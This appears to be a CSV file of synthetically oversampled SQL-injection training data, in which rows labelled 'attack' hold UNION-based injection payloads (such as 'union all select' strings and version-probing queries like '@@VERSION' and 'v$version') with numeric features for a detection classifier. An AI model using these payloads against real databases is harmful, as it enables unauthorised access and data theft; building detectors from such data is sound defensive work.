id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000232,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000092,0.12969954384131335,69.08791768598164,24.0,4.06401167787745,27.0,23.27033414878531,11.0,7.817583537196327,0.3911266423029661,0.33644249801129944,0.15934789130861582,0.11308296837711865,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,3.817583537196328,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000233,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000131,0.562536470685288,84.98179381404736,23.796358762809472,3.9650600792545805,27.0,35.18543505123789,11.0,11.796358762809472,0.3195076603678911,0.4118573607382656,0.13016978755728897,0.1384651913365543,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,6.796358762809472,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000234,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000117,0.4862588029555524,85.69109805454713,26.0,4.000046865581652,25.0,29.84292814545899,20.61780389090576,10.230366018182373,0.2918078273577971,0.3477671319300394,0.2410841141078814,0.11934092660428217,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.769633981817626,0.0,0.0,3.4607320363647474,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000235,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000096,1.085261790807397,90.07120016267518,29.521360048802556,4.248850504918423,33.05696013014015,28.0,16.01424003253504,13.0,0.36566895434604735,0.3118274173925814,0.17772661304338705,0.14477701521798422,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.5071200162675186,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.5071200162675185
SMOTE_000236,attack,union,"-4947' in boolean mode  )   union all select 3314,3314#",nearest_attack_euclidean,R000064,0.37859550159221284,57.0782124330428,24.41564248660856,4.141466515050526,27.0,13.66256994643424,11.0,5.415642486608561,0.4739055346387407,0.23833418116889987,0.19307262522319066,0.09468765896916873,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,1.4156424866085606,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000237,attack,union,"-5054%""   )    )     )   union all select 8263,8263,8263,8263--",nearest_attack_euclidean,R000144,0.35485988388046186,65.30069567688864,22.539860864622273,3.856379527967333,14.0,21.840556541510903,18.0,11.460139135377727,0.21470360889905676,0.33378644924776246,0.27604749715593013,0.17546244469725064,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,3.0,1.0,0.0,3.4601391353777258,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000238,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000146,0.5214643397343768,103.04168652970031,29.0,4.155737834814401,37.0,35.23334922376024,17.0,13.80833730594006,0.3604871166401815,0.34013535390766036,0.1656292157535969,0.13374831369856124,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.808337305940062,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000239,attack,union,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",nearest_attack_euclidean,R000128,0.49035953574739516,122.90127252980781,29.16050901192313,4.190147480240375,35.32101802384626,52.0,16.580254505961562,19.0,0.28680209873933166,0.4235919185008691,0.13483201253832783,0.1547739702214714,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,9.0,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.7901272529807819,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.790127252980782
SMOTE_000240,attack,union,"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",nearest_attack_euclidean,R000101,0.9969496164299193,111.53180697171848,27.49545614689736,3.855491307574313,25.0,52.0,19.027263118615846,15.504543853102641,0.22437236921956827,0.46669452797670197,0.16992234341892234,0.1390107593848074,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.504543853102641,0.0,0.0,9.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000241,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000087,0.12918237225707252,55.83215772236328,18.72214384815755,3.652820696121149,14.0,28.665726177890626,4.0,9.166431544472657,0.2549443673655237,0.5086350087251157,0.07284124781872106,0.16357937609063947,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,5.1664315444726565,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000242,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R000142,0.23670033025599202,86.66861541234418,22.0,3.60890978619642,14.0,42.66861541234418,14.266276917531163,15.733723082468835,0.1622057794497295,0.49021040744370725,0.16612161647224663,0.18146219663431662,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.0665692293827913,1.0,0.0,8.667153853086045,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000243,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000129,0.06817639723722722,66.26086914742987,20.10434765897195,3.597196262926474,14.0,36.2086953179439,4.0,12.052173829485975,0.21134183353307334,0.546389799760312,0.060383381009449524,0.18188498569716516,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,7.052173829485975,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000244,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000124,0.0008256163700727072,40.0,19.998854945134767,4.058509177970149,14.0,16.0,4.0,6.0,0.35,0.4,0.09999999999999999,0.15,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.0,0.0,2.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000245,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000129,0.027085491482300897,66.1036395197909,20.04145580791636,3.5892926490899977,14.0,36.08291161583272,4.0,12.02072790395818,0.21181157633865286,0.5458261083936166,0.0605175932396151,0.18184472202811547,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,7.02072790395818,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000246,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000072,0.03445242522110382,66.24049694139532,20.0,3.6148038455305427,14.0,36.19239755311626,4.0,12.048099388279065,0.21140269799839212,0.5463167624019294,0.06040077085668345,0.18187976874299497,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,7.048099388279065,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000247,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000027,0.12968463261296978,75.96744818928553,33.90234456785662,4.462309454433212,42.130207242857836,2.967448189285541,17.0,13.869792757142163,0.554607530966176,0.03905679259962186,0.22378129487406068,0.18255438156014153,2.9023445678566224,0.0,2.0,0.0,1.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.0,0.9674481892855409,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000248,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000042,1.348283395712968,75.51119026120821,19.48880973879178,3.4271954230812556,14.0,44.0,4.0,13.51119026120822,0.1854111116391377,0.5827206365801472,0.05297460332546791,0.1788936484552473,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,0.5111902612082191,0.0,9.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000249,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000092,0.5103566007678919,72.34285878590244,24.937143514360976,4.1444346646299275,27.0,25.87428702872195,11.0,8.468571757180488,0.37366529767250173,0.3571374249807387,0.15223401016287108,0.1169632671838885,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,4.468571757180488,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000250,attack,union,"-5054%""   )    )     )   union all select 8263,8263,8263,8263--",nearest_attack_euclidean,R000144,1.04559851810252,59.31492001738815,22.50865600231842,3.8640250851507423,14.0,18.034624009273678,17.01731200463684,10.26298400347763,0.23928277769727707,0.300887206427407,0.287176619040719,0.1726533968345969,0.2456719988407905,0.7543280011592097,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.7543280011592097,1.0,0.0,2.5086560023184195,3.0,0.24567199884079027,0.7543280011592098,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000251,attack,union," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000035,0.4314557606800323,102.12539703433005,26.12539703433005,4.087089102984053,62.0,5.0,24.0,11.125397034330051,0.6071031204903423,0.0489599290718018,0.23500765954464864,0.10892929089320719,3.0,0.0,2.0,0.0,1.8746029656699488,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.125397034330051,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.12539703433005112,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000252,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000136,0.632976243344463,66.03618614370487,24.007237228740973,4.123524642424289,27.0,20.028948914963895,11.0,8.007237228740975,0.4112267314984919,0.300435674327758,0.16753681653642263,0.12080077763732748,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,3.0072372287409737,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000253,attack,union," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000035,0.4507334800249557,102.13099985402746,26.130999854027465,4.087308864002052,62.0,5.0,24.0,11.130999854027465,0.6070700560679894,0.04895726258612815,0.23499486041341527,0.10897782093246709,3.0,0.0,2.0,0.0,1.8690001459725358,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.130999854027464,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.13099985402746403,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000254,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000004,0.6176499296924101,101.64363845953042,25.178180770234786,4.03585688879399,65.28727691906084,4.1781807702347855,24.0,8.178180770234786,0.642237461511294,0.04113724360057125,0.23613261538934016,0.0804926794987946,0.0,0.0,2.0,0.0,1.8218192297652134,2.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,6.178180770234787,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.17818077023478673,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000255,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000100,0.05468237825666869,61.434906215821925,21.043490621582194,3.8873386517291686,14.0,32.347924972657545,4.0,11.086981243164386,0.22810235811094273,0.5262771702668687,0.06517210231741222,0.18044836930477634,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,-1.1102230246251565e-16,1.0,0.0,6.086981243164385,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000256,attack,union,"-4015'||  (  select 'qeqv' from dual where 1437  =  1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",nearest_attack_euclidean,R000122,0.6229700736651598,115.15317596832665,33.154047209502004,4.346195956013911,37.0,44.92254077466133,17.0,16.230635193665332,0.3218975012853222,0.38936318754953503,0.14789885194190477,0.1408404592232381,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.230635193665331,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000257,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,0.26866879918903513,76.0,33.0,4.439993102099514,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,5.406341841449457,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000258,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R000142,0.5453897081579406,89.87588661308679,21.62482267738264,3.5626457017823148,14.0,44.0,15.500709290469436,16.375177322617358,0.1558819143959903,0.4899145881016839,0.17201857343329607,0.1821849240690297,0.0,1.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,2.375177322617359,1.0,0.0,9.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000259,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000113,0.15376412035451642,103.83494183941269,27.917470919706346,4.033154702500967,29.0,44.0,15.0,15.83494183941269,0.27929738750537636,0.423761553456433,0.1444641659510567,0.15247689308713394,2.834941839412689,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000260,attack,union,"-1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",nearest_attack_euclidean,R000051,0.08821754820792792,108.43532206133787,28.887064412267577,4.116556100501427,29.0,47.548257649070294,15.0,16.887064412267577,0.26749961716841936,0.43841431058613667,0.13836187094918243,0.15572420129626163,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.887064412267575,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000261,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000136,0.5598247472752174,63.881798333239004,24.1527193332956,4.163338987562767,27.0,18.3054386665912,11.0,7.5763596666478,0.42329643442686216,0.2857732203999601,0.17245410291464752,0.11847624225853026,1.0,0.0,3.0,0.0,0.0,1.1102230246251565e-16,0.0,1.0,0.0,0.0,2.576359666647801,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000262,attack,union,"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",nearest_attack_euclidean,R000047,0.008445741013937485,85.99581327985344,31.0,4.325014370595083,29.01674688058625,31.974879679120626,15.004186720146564,10.0,0.33742547710612786,0.37181251764245066,0.17447713991345554,0.11628486533796589,1.0041867201465626,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.9937199197801565,3.0020933600732813,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0020933600732812585,2.0,1.0,1.0,0.0020933600732813695,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.002093360073282
SMOTE_000263,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000146,0.9227953043498138,106.15226155859688,29.0,4.129523148671786,37.0,37.721809246877505,17.0,14.430452311719376,0.3502894136391915,0.3531443155737881,0.16094378464503392,0.13562248614198644,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.430452311719376,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
